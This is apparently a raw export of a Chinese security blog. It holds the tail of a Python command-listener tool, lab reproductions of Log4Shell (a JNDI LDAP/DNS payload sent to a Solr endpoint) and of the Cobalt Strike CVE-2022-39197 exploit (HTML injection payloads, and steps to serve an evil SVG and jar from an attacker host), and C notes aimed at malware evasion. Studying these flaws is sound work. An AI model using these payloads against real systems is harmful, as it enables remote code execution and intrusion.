class="keyword">except</span> socket.error, e:</span><br><span class="line">    error(<span class="string">&#x27;Try again in 30 seconds or so...&#x27;</span>)</span><br><span class="line">    pad()  </span><br><span class="line">    bad(<span class="string">&#x27;Socket Error:\n\t%s\n&#x27;</span> % e)</span><br><span class="line">  <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    error(<span class="string">&quot;CTRL+C Interupt Detected!&quot;</span>)</span><br><span class="line">    bad(<span class="string">&quot;Shutting Down Web Server...\n&quot;</span>)</span><br><span class="line">    httpd.shutdown</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Parse Arguments/Options</span></span><br><span class="line">parser = optparse.OptionParser(banner(), version=<span class="string">&quot;%prog v0.01&quot;</span>)</span><br><span class="line">parser.add_option(<span class="string">&quot;-i&quot;</span>, <span class="string">&quot;--ip&quot;</span>, dest=<span class="string">&quot;ip&quot;</span>, default=<span class="literal">None</span>, <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;IP to Bind Server to (i.e. 192.168.0.69)&quot;</span>)</span><br><span class="line">parser.add_option(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--port&quot;</span>, dest=<span class="string">&quot;port&quot;</span>, default=<span class="literal">None</span>, <span class="built_in">type</span>=<span class="string">&quot;int&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Port to Run Server on&quot;</span>)</span><br><span class="line">parser.add_option(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, dest=<span class="string">&quot;url&quot;</span>, default=<span class="string">&quot;/connect&quot;</span>, <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;URL to Initiate Client Connection (default: /connect)&quot;</span>)</span><br><span class="line">parser.add_option(<span class="string">&quot;-f&quot;</span>, <span class="string">&quot;--find-ip&quot;</span>, action=<span class="string">&quot;count&quot;</span>, default=<span class="number">0</span>, dest=<span class="string">&quot;fip&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Display Current Internal and External IP Addresses&quot;</span>)</span><br><span class="line">parser.add_option(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--command&quot;</span>, default=<span class="string">&quot;whoami&quot;</span>, <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>, dest=<span class="string">&quot;cmd&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;auto Send command to client (No interaction)&quot;</span>)</span><br><span class="line">parser.add_option(<span class="string">&quot;-v&quot;</span>, action=<span class="string">&quot;count&quot;</span>, default=<span class="number">0</span>, dest=<span class="string">&quot;verbose&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Enable Verbose Output&quot;</span>)</span><br><span class="line">(options, args) = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Make sure we got necessary arguments</span></span><br><span class="line">args = sys.argv[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;&quot;</span></span><br><span class="line">  parser.print_help()</span><br><span class="line">  <span class="built_in">print</span></span><br><span class="line">  sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> options.fip:</span><br><span class="line">  <span class="built_in">print</span> red(<span class="string">&quot;[Checking IP....]&quot;</span>)</span><br><span class="line">  good(<span class="string">&quot;Internal IP: %s&quot;</span> % internal_ip())</span><br><span class="line">  good(<span class="string">&quot;External IP: %s\n\n&quot;</span> % external_ip())</span><br><span class="line">  sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Establish IP to bind our web server to (i.e. 127.0.0.1||192.168.0.69||10.10.10.10)</span></span><br><span class="line"><span class="keyword">if</span> args <span class="keyword">and</span> options.ip == <span class="literal">None</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&#x27; &#x27;</span></span><br><span class="line">  error(<span class="string">&quot;Missing Argument: --ip IP&quot;</span>)</span><br><span class="line">  error(<span class="string">&quot;You need to provide the IP to bind server to!\n&quot;</span>)</span><br><span class="line">  parser.print_help()</span><br><span class="line">  <span class="built_in">print</span></span><br><span class="line">  sys.exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  bind_ip = options.ip</span><br><span class="line"></span><br><span class="line"><span class="comment"># Establish listner port for our web server (privs needed for low ports &lt; 1024)</span></span><br><span class="line"><span class="keyword">if</span> args <span class="keyword">and</span> options.port == <span class="literal">None</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&#x27; &#x27;</span></span><br><span class="line">  error(<span class="string">&quot;Missing Argument: --port PORTNUMBER&quot;</span>)</span><br><span class="line">  error(<span class="string">&quot;You need to provide the port to listen on!\n&quot;</span>)</span><br><span class="line">  parser.print_help()</span><br><span class="line">  <span class="built_in">print</span></span><br><span class="line">  sys.exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  listener_port = options.port</span><br><span class="line">  <span class="keyword">if</span> options.cmd <span class="keyword">not</span> <span class="keyword">in</span> args:</span><br><span class="line">  	status(<span class="string">&quot;Using interactive method! &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> options.cmd <span class="keyword">in</span> args:</span><br><span class="line">  command = options.cmd</span><br><span class="line">  status(<span class="string">&quot;Using Command Send method! &quot;</span>)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># Establish system based file seperator</span></span><br><span class="line"><span class="keyword">if</span> os.name == <span class="string">&#x27;nt&#x27;</span> <span class="keyword">or</span> sys.platform.startswith(<span class="string">&#x27;win&#x27;</span>):</span><br><span class="line">  delimiter = <span class="string">&quot;\\&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  delimiter = <span class="string">&quot;/&quot;</span></span><br><span class="line"></span><br><span class="line">srv_url    = options.url     <span class="comment"># The URL path to start client initiation on</span></span><br><span class="line">verbose    = options.verbose <span class="comment"># Enable verbose output for debugging purposes</span></span><br><span class="line">home       = os.path.dirname(os.path.abspath(__file__)) + delimiter <span class="comment"># Home dir</span></span><br><span class="line">outdir     = home + <span class="string">&quot;loot&quot;</span> + delimiter  <span class="comment"># Output directory to save content</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(outdir) <span class="keyword">and</span> <span class="keyword">not</span> os.path.isdir(outdir):</span><br><span class="line">  os.mkdir(outdir)          <span class="comment"># Create output directory if it doesn&#x27;t exist</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Time for the magic show</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">str</span>(red(<span class="string">&quot;[&quot;</span>)) + <span class="built_in">str</span>(white(<span class="string">&quot;WARNING&quot;</span>)) + <span class="built_in">str</span>(red(<span class="string">&quot;]&quot;</span>)) + <span class="built_in">str</span>(white(<span class="string">&quot; CTRL+C, closing session...\n\n&quot;</span>))</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2021-44228 Apache Log4j2 lookup feature JNDI injection     漏洞复现</title>
    <url>/2022/07/09/CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-漏洞复现"><a href="#CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-漏洞复现" class="headerlink" title="CVE-2021-44228 Apache Log4j2 lookup feature JNDI injection     漏洞复现"></a>CVE-2021-44228 Apache Log4j2 lookup feature JNDI injection     漏洞复现</h1><p>此次复现环境使用的是vulhub</p>
<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>首先启用vulhub</p>
<p><img src="/2022/07/09/CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220709123945520.png" alt="image-20220709123945520"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:dns://$&#123;sys:java.version&#125;.example.com&#125;是利用JNDI发送DNS请求的Payload，我们将其作为管理员接口的action参数值发送如下数据包：</span><br><span class="line"></span><br><span class="line">GET /solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.example.com&#125; HTTP/1.1</span><br><span class="line">Host: your-ip:8983</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">我们可以在DNS日志平台收到相关日志，显示出当前Java版本：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">实际利用JNDI注入漏洞，可以使用这个工具。利用完毕后，可见touch /tmp/success已经成功被执行：</span><br></pre></td></tr></table></figure>



<p>可以看到dnslog平台上面已经有了java版本</p>
<p><img src="/2022/07/09/CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220709125247095.png" alt="image-20220709125247095"></p>
<p><img src="/2022/07/09/CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220709125426263.png" alt="image-20220709125426263"></p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p><a href="https://blog.csdn.net/hilaryfrank/article/details/121944757">(88条消息) Log4j2注入漏洞万字剖析-汇总收藏版(攻击步骤、漏洞原理、2.15.0-RC1绕过原理以及2.15.0、2.16.0修复原理)_程序员Daddy的博客-CSDN博客</a></p>
]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2022-39197 (CobaltStrike＜=4.7)rce漏洞复现</title>
    <url>/2022/10/26/CVE-2022-39197-CobaltStrike%EF%BC%9C-4-7-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="CVE-2022-39197-CobaltStrike＜-4-7-rce漏洞复现"><a href="#CVE-2022-39197-CobaltStrike＜-4-7-rce漏洞复现" class="headerlink" title="CVE-2022-39197 (CobaltStrike＜=4.7)rce漏洞复现"></a>CVE-2022-39197 (CobaltStrike＜=4.7)rce漏洞复现</h1><p>总结一下这个反制神洞，理解一下原理</p>
<h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><p>对面的CobaltStrike 版本小于4.7，开启swing渲染</p>
<h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><h2 id="swing渲染"><a href="#swing渲染" class="headerlink" title="swing渲染"></a>swing渲染</h2><p>目前看来是swing（一种java GUI的库）自带的特性。看到没，文档里直接告诉我们一个事实：在内容的开头插入<code>&lt;html&gt;</code>标签后续的内容就会被格式化为html文档进行解析，也就是说支持html标签。在官方的文章中也已经写有如何使用swing渲染html</p>
<p><img src="/2022/10/26/CVE-2022-39197-CobaltStrike%EF%BC%9C-4-7-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20221024161233213.png" alt="image-20221024161233213"></p>
<p>现在进入jdk的rt.jar包进行分析（包含所有核心Java 运行环境的已编译calss文件）</p>
<p><img src="/2022/10/26/CVE-2022-39197-CobaltStrike%EF%BC%9C-4-7-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20221024155730742.png" alt="image-20221024155730742"></p>
<p>在swing中寻找答案（是上面的html文件夹，截错图了）</p>
<h2 id="objectview"><a href="#objectview" class="headerlink" title="objectview"></a>objectview</h2><p>在其中的HTMLEditorKit.java文件中，有一个create方法，其中不同的标签会对应到创建不同的view。这里object标签创建了一个objectview。</p>
<p>现在看看object标签是什么。</p>
<p>我的代码中没有注释，这里我就用大佬的图片。</p>
<p><img src="/2022/10/26/CVE-2022-39197-CobaltStrike%EF%BC%9C-4-7-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20221024173328434.png" alt="image-20221024173328434"></p>
<p><strong>这个objectview大体上就是可以实例化一个符合要求的类并且通过param进行参数传递！</strong></p>
<p>后面看objectview的代码，说实话我的java并不是很强（又挖坑学java，今年要学的实在是太多了）</p>
<p>我就看看大佬对代码的解析吧。</p>
<p><img src="/2022/10/26/CVE-2022-39197-CobaltStrike%EF%BC%9C-4-7-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20221024174126972.png" alt="image-20221024174126972"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">明显的反射调用并且实例化类，这里要注意的是他还加了个限制判断，也就是实例必须继承与Component，否则就抛出异常。这也大大限制了我们所能操作的范围。我们继续跟入setParameters看看是怎么传递参数的</span><br></pre></td></tr></table></figure>

<p><img src="/2022/10/26/CVE-2022-39197-CobaltStrike%EF%BC%9C-4-7-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20221024174224243.png" alt="image-20221024174224243"></p>
<ol>
<li>classid传入需要实例化的类，类必须继承与Component</li>
<li>必须有无参构造方法，貌似是因为newinstant是调用的无参构造方法</li>
<li>必须存在一个setXXX方法的XXX属性</li>
<li>setXXX方法的传参数必须是接受一个string类型的参数</li>
</ol>
<h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>这里我是看大佬文章直接拿到利用链的，感谢大佬(<a href="https://blog.51cto.com/u_15634773/5767622">最新CS RCE（CVE-2022-39197）复现心得分享_mb627b50e21abf2的技术博客_51CTO博客</a>)</p>
<p><code>org.apache.batik.swing.JSVGCanvas--&gt;setURI</code></p>
<p>注意这里必须寻找的cs里面的类，jdk中没有可以利用的链子。</p>
<p>这个方法的功能是设置SVG图片的地址，远程加载SVG图片，再通过svg加载自己的恶意类。如果想按照ScriptEngineManager的方式转化为java代码来实现rce，在cs环境中是不行的，因为cs环境中没有需要的javascript相关的库。</p>
<p>等我java有成了来编写自己的工具，（一定</p>
<h1 id="exp使用"><a href="#exp使用" class="headerlink" title="exp使用"></a>exp使用</h1><h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>首先使用CobaltStrikeParser和木马分析出对面的url和publickey，我这里试了下我之前的免杀马，发现免杀马分析不出。不过我目前还不了解分析的原理，等学习完之后或许可以自己写一个分析脚本。（后面写文_再次挖坑）</p>
<p>这里借用的是其他师傅写的poc，分别是CobaltStrikeParser，CVE-2022-39197-POC。</p>
<p>首先用CobaltStrikeParser拿到其中的ip，port和密钥。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 parse_beacon_config.py beacon4.3_x64.exe --json</span><br></pre></td></tr></table></figure>

<p>他会输出相关的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将Port、C2Server(记得加二级目录)、HttpPostUri进行拼接，这里变成：http://172.16.12.13:8080/visit.js/submit.php，记录下来</span><br><span class="line"></span><br><span class="line">将PublicKey复制到一个txt文件中，注意去除前后的空格</span><br></pre></td></tr></table></figure>



<p>分析出之后用f12团队大佬的工具CS_fakesubmit，将其中主机名改为<code>&lt;html&gt;&lt;img src=http://10.10.11.2/1.png&gt;</code>即可实现xss反制。</p>
<p><code>&lt;html&gt;1&lt;frame src=x&gt;</code>（这个是引入外部页面的标签，这样引入的外部html就不会受到限制了。）同样利用，frame就可以绕过长度限制，而且上线之后，对方的cs客户端非常非常非常卡，可以用来打ddos。</p>
<p><img src="/2022/10/26/CVE-2022-39197-CobaltStrike%EF%BC%9C-4-7-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20221024153724925.png" alt="image-20221024153724925"></p>
<p>dnslog</p>
<p><img src="/2022/10/26/CVE-2022-39197-CobaltStrike%EF%BC%9C-4-7-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20221024154358887.png" alt="image-20221024154358887"></p>
<p>如果payload是这样的话</p>
<p><code>&lt;html&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>直接把客户端卡死了</p>
<p>但是有大佬说script标签是不生效的，可是我客户端确实卡死了。</p>
<h2 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h2><p>这里用的是外国大佬的exp简单讲下如何使用</p>
<p>1.拿到工具之后，首先在<code>EvilJar\src\main\java</code>中修改自己想要的java类中的payload。</p>
<p>2.然后在<code>\EvilJar</code>中执行命令，生成恶意的jar包<code>mvn clean compile assembly:single</code></p>
<p>3.将生成好的<code>EvilJar-1.0-jar-with-dependencies.jar</code>从<code>EvilJar/target/</code>移动到<code>serve/</code></p>
<p>4.修改<code>server\evil.svg</code>中的attacker，将自己的恶意类和svg图片都放在这个服务器上面上面。</p>
<p>5.最后输入<code>python3 cve-2022-39197.py beacon.exe http://10.10.10.2:8080/evil.svg</code></p>
<p>等对面点击Process List的时候就会自动加载你的恶意类了。</p>
<p>我也放一张截图庆祝一下</p>
<p><img src="/2022/10/26/CVE-2022-39197-CobaltStrike%EF%BC%9C-4-7-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/000AD0FB.jpg" alt="img"></p>
<p><img src="/2022/10/26/CVE-2022-39197-CobaltStrike%EF%BC%9C-4-7-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20221026194730868.png" alt="image-20221026194730868"></p>
]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>C语言1-空函数、裸函数、调用预定、数据宽度、全局变量&amp;局部变量</title>
    <url>/2024/01/02/C%E8%AF%AD%E8%A8%801-%E7%A9%BA%E5%87%BD%E6%95%B0%E3%80%81%E8%A3%B8%E5%87%BD%E6%95%B0%E3%80%81%E8%B0%83%E7%94%A8%E9%A2%84%E5%AE%9A%E3%80%81%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E3%80%81%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F-%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F/</url>
    <content><![CDATA[<h1 id="C语言1-空函数、裸函数、调用预定、数据宽度、全局变量-amp-局部变量"><a href="#C语言1-空函数、裸函数、调用预定、数据宽度、全局变量-amp-局部变量" class="headerlink" title="C语言1-空函数、裸函数、调用预定、数据宽度、全局变量&amp;局部变量"></a>C语言1-空函数、裸函数、调用预定、数据宽度、全局变量&amp;局部变量</h1><p>杂项放到最后了</p>
<h1 id="空函数"><a href="#空函数" class="headerlink" title="空函数"></a>空函数</h1><p>空函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注：hook，跳过原函数的东西，运行我们自己的函数。比如说把call指令前面的东西换成jmp，跳转到我们自己写的函数。</p>
<p>空函数是有初始化的，有call有ret</p>
<h1 id="裸函数"><a href="#裸函数" class="headerlink" title="裸函数"></a>裸函数</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> _declspec(naked) function()&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加上了裸函数关键字之后，就相当于告诉编译器，不用管我们的堆栈，不用初始化，全部都由我们自己弄。这个就没有初始化了，没有call没有ret</p>
<p>所以我们需要自己编写汇编语句，需要用到一个关键字，_asm</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> _declspec(naked) function()&#123;</span><br><span class="line">    _asm&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h1><p>_cdecl 从右往左入栈 调用者清理堆栈 外平线（默认）他会自己去平衡堆栈，他是在函数外面平衡堆栈，所以函数内部就不用平衡堆栈了，也就是降低栈。</p>
<p><img src="/2024/01/02/C%E8%AF%AD%E8%A8%801-%E7%A9%BA%E5%87%BD%E6%95%B0%E3%80%81%E8%A3%B8%E5%87%BD%E6%95%B0%E3%80%81%E8%B0%83%E7%94%A8%E9%A2%84%E5%AE%9A%E3%80%81%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E3%80%81%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F-%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F/image-20231231222606782-1704208457630.png" alt="image-20231231222606782"></p>
<p>_stdcall 从右往左入栈 自身清理堆栈  内平线</p>
<p>而这个是在函数内部进行堆栈平衡，</p>
<p><img src="/2024/01/02/C%E8%AF%AD%E8%A8%801-%E7%A9%BA%E5%87%BD%E6%95%B0%E3%80%81%E8%A3%B8%E5%87%BD%E6%95%B0%E3%80%81%E8%B0%83%E7%94%A8%E9%A2%84%E5%AE%9A%E3%80%81%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E3%80%81%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F-%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F/image-20231231224037381-1704208457630.png" alt="image-20231231224037381"></p>
<p>_fastcall将前两个参数用ecx edx传入，剩下的参数从右往左入栈  自身清理堆栈 内平线 </p>
<p>这个只有前两个参数是存在寄存器（从左往右数），后面的参数是存在内存的。</p>
<h1 id="数据宽度"><a href="#数据宽度" class="headerlink" title="数据宽度"></a>数据宽度</h1><p>主要分为整数类型和浮点数类型</p>
<p>整数类型：</p>
<p>char 8bit 1字节 对应byte<br>short 16bit 2字节 对应word<br>int 32bit 4字节 对应dword  </p>
<p>有符号数和无符号数</p>
<p>有符号数：会把第一位当作符号，所以范围是-128<del>127<br>无符号数：8个位全可以用，所以范围是0</del>255</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> c =<span class="number">128</span>; <span class="comment">//这个就是越界了</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> u = <span class="number">128</span>; <span class="comment">//这就就是不越界</span></span><br><span class="line"><span class="comment">//但是在汇编语句中，有符号数和无符号数的表现形式是一样的</span></span><br><span class="line"><span class="comment">//只有在运算的时候是不一样的</span></span><br><span class="line"><span class="comment">//运算的时候有什么不一样呢？</span></span><br><span class="line"><span class="comment">//他们运算的时候都jcc语句的比较是不一样的</span></span><br><span class="line"><span class="comment">//有符号数的jcc语句是jle，无符号数是jbe</span></span><br></pre></td></tr></table></figure>



<p>而在c语言中如何分别有符号数和无符号数呢？<br>unsigned关键字就是无符号数（之前我的blog有写）</p>
<h1 id="全局变量-局部变量"><a href="#全局变量-局部变量" class="headerlink" title="全局变量/局部变量"></a>全局变量/局部变量</h1><p>全局变量是整个程序可访问的变量，生存期从程序开始到程序结束；局部变量存在于模块中（比如某个函数），只有在模块中可以访问，生存期从模块开始到结束。</p>
<p>全局变量分配在全局数据段，在程序开始运行的时候被加载，局部变量则分配在程序的堆栈中。因此，操作系统和编译器可以通过内存的分配位置来知道区分全局变和局部变量。</p>
<p>全局变量和局部变量的区别是在存储器中的位置不同，具体说，全局变量存储在数据段中，局部变量一般存在堆栈段 。</p>
<p><strong>全局变量</strong><br>1.全局变量的地址在程序编译时就已经确定，如果没有赋初始值则为0<br>2.全局变量可以被所有函数修改，存储的是最后一个函数所赋的值。<br>3.全局变量占用的内存会一直存在，知道进程结束。<br>4.反汇编：mov 寄存器,dword ptr ds:[0x1234567]<br>5.初始化可以不赋初值</p>
<p><strong>局部变量</strong><br>1.局部变量没有固定地址，需要在调用的时候才会在堆栈里面分配内存<br>2.局部变量执行完毕之后数据仍然保存在堆栈，但已经没有作用<br>3.只在函数内部使用，不能跨函数调用<br>4.反汇编:mov eax,[esp-4]<br>5.初始化必须赋初值</p>
<h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><p>1.如果写东西出现0xc0005出来，那么很有可能是地址不正确</p>
<p>2.一般函数的过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.提栈</span><br><span class="line">2.保存现场</span><br><span class="line">3.填充缓冲区</span><br><span class="line">4.函数的核心功能</span><br><span class="line">5.恢复现场</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-miansha</category>
      </categories>
  </entry>
  <entry>
    <title>C语言2-数组、条件语句、参数传递、结构体、dll编写</title>
    <url>/2024/01/07/C%E8%AF%AD%E8%A8%802-%E6%95%B0%E7%BB%84%E3%80%81%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5%E3%80%81%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E3%80%81%E7%BB%93%E6%9E%84%E4%BD%93%E3%80%81dll%E7%BC%96%E5%86%99/</url>
    <content><![CDATA[<h1 id="C语言2-数组、条件语句、参数传递、结构体、dll编写"><a href="#C语言2-数组、条件语句、参数传递、结构体、dll编写" class="headerlink" title="C语言2-数组、条件语句、参数传递、结构体、dll编写"></a>C语言2-数组、条件语句、参数传递、结构体、dll编写</h1><p>这些除了dll编写宝宝之前都学过捏，先看看把。看看他是怎么从面杀角度讲解的。</p>
<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>值得注意的是，cs里面的shellcode也是存在数组里面的。</p>
<p>这里讲数组的定义啊，基础类的我就不记笔记了。之前的《c语言碎碎念》博客都有些。</p>
<p>下面是一个数组，在内存中的形式，值得注意的是，数组最后会跟一个00，也就是如下图所示，数组中02是最后一个元素，然后跟了个0。用0结尾。</p>
<p><img src="/2024/01/07/C%E8%AF%AD%E8%A8%802-%E6%95%B0%E7%BB%84%E3%80%81%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5%E3%80%81%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E3%80%81%E7%BB%93%E6%9E%84%E4%BD%93%E3%80%81dll%E7%BC%96%E5%86%99/image-20240103000532874.png" alt="image-20240103000532874"></p>
<h1 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h1><p>这个也不多说好吧，如果他讲了免杀相关的我就写，没得话有需要可以看看我不久之前的博客。</p>
<h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><p>1.底层反汇编与正向代码逻辑相反。比如说一个是i&gt;j，那底层的汇编就是jle，小于等于则跳转，大于则不跳转，</p>
<h2 id="elseif和if的区别"><a href="#elseif和if的区别" class="headerlink" title="elseif和if的区别"></a>elseif和if的区别</h2><p>就是看jle跳转之后，跳转之后的地址的上一行是否有jmp语句，如果有，则是ifelse语句。</p>
<p>如果要看有几个elseif，那么就直接看有几个jmp就行。<br>if…else  if..else</p>
<h2 id="while"><a href="#while" class="headerlink" title="while"></a>while</h2><p>这个的底层代码是是je，如果相等则跳转。他的底层逻辑和代码的逻辑也是相反的。</p>
<h2 id="do-while"><a href="#do-while" class="headerlink" title="do-while"></a>do-while</h2><p>至少会执行循环体一次</p>
<h1 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h1><p>参数传递的本质：将上层函数的变量，或者表达式的值复制一份，传递给下层函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> i = function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">function</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    x = x +<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">2</span>;</span><br><span class="line">    function(x);</span><br><span class="line">    <span class="comment">//看过我之前的博客就知道，这个x还是2.</span></span><br><span class="line">    <span class="comment">//在vc中看堆栈，可以看到两个根本不是一个地址</span></span><br><span class="line">    <span class="comment">//以后免杀还要专门弄个虚拟机</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h1><p>结构体有个好处就是可以反复利用。</p>
<p>q1</p>
<p><img src="/2024/01/07/C%E8%AF%AD%E8%A8%802-%E6%95%B0%E7%BB%84%E3%80%81%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5%E3%80%81%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E3%80%81%E7%BB%93%E6%9E%84%E4%BD%93%E3%80%81dll%E7%BC%96%E5%86%99/image-20240107221844568.png" alt="image-20240107221844568"></p>
